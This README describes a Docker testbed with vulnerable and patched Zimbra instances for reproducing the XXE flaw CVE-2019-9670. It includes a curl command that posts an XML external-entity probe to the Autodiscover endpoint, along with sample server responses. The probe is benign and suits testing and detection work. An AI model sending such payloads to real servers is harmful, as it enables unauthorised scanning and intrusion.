# Synacor Zimbra XXE (CVE-2019-9670)

This file describes how to setup a zimbra environment that is vulnerable (and not vulnerable) to CVE-2019-9670.

The vulnerability is an XXE affecting Synacor Zimbra Collaboration Suite.

## Testbed Setup
To setup the testbed, simply execute

```
./bootstrap.sh
```

The script will take care of building the docker images, deploying the docker containers and installing the zimbra applications.

- The vulnerable testbed is based on `8.7.1` version of zimbra, and
  specifically the following releases was used
  
  ```
  zcs-8.7.1_GA_1670.UBUNTU14_64.20161025045105.tgz
  ```
  
  The vulnerable testbed listens on port `8443`.
  
- The non vulnerable testbed is based on `8.8.15` version of zimbra, and
  specifically the following releases was used
  
  ```
  zcs-8.8.15_GA_3869.UBUNTU14_64.20190918004220.tgz
  ```
  
  The non vulnerable testbed listens on port `8500`.

## Reproduction Steps

To test out the vulnerability, the following curl command can be used:

```
ZIMBRA_HOST="127.0.0.1"
ZIMBRA_PORT="8443"
curl -k -X POST --data '<!DOCTYPE foo [<!ENTITY xxe "Test"> ]><Request><EMailAddress>email</EMailAddress><AcceptableResponseSchema>&xxe;</AcceptableResponseSchema></Request>' "https://${ZIMBRA_HOST}:${ZIMBRA_PORT}/Autodiscover/Autodiscover.xml"
```

which will generate a POST request similar to the one reported below:

```
POST /Autodiscover/Autodiscover.xml HTTP/1.1
Host: 127.0.0.1:8443
User-Agent: curl/7.81.0
Accept: */*
Content-Length: 149
Content-Type: application/x-www-form-urlencoded

<!DOCTYPE foo [<!ENTITY xxe "Test"> ]><Request><EMailAddress>email</EMailAddress><AcceptableResponseSchema>&xxe;</AcceptableResponseSchema></Request>
```

### Vulnerable Response

When sent to the vulnerable instance on port `8443`, the response will contain the string `Test`, as shown in the example below:

```
HTTP/1.1 503 Requested response schema not available Test
Date: Thu, 19 Dec 2024 09:14:18 GMT
Content-Type: text/html;charset=iso-8859-1
Cache-Control: must-revalidate,no-cache,no-store
Content-Length: 339

<html>
<head>
<meta http-equiv="Content-Type" content="text/html;charset=utf-8"/>
<title>Error 503 Requested response schema not available Test</title>
</head>
<body><h2>HTTP ERROR 503</h2>
<p>Problem accessing /service/autodiscover/Autodiscover.xml. Reason:
<pre>    Requested response schema not available Test</pre></p>
</body>
</html>
```

### Non Vulnerable Response

When sent to the non vulnerable instance on port `8500`, the response will not contain the string `Test`, as shown in the example below:

```
HTTP/1.1 400 Body cannot be parsed
Date: Thu, 19 Dec 2024 09:07:02 GMT
Cache-Control: must-revalidate,no-cache,no-store
Content-Type: text/html;charset=iso-8859-1
Content-Length: 293

<html>
<head>
<meta http-equiv="Content-Type" content="text/html;charset=utf-8"/>
<title>Error 400 Body cannot be parsed</title>
</head>
<body><h2>HTTP ERROR 400</h2>
<p>Problem accessing /service/autodiscover/Autodiscover.xml. Reason:
<pre>    Body cannot be parsed</pre></p>
</body>
</html>
```

## References
* https://nvd.nist.gov/vuln/detail/cve-2019-9670
* https://blog.tint0.com/2019/03/a-saga-of-code-executions-on-zimbra.html
* https://blog.zimbra.com/2019/03/new-zimbra-8-7-11-patch-10/
* https://attackerkb.com/topics/7bMNsBStux/zimbra-collaboration-suite-autodiscover-xxe/vuln-details
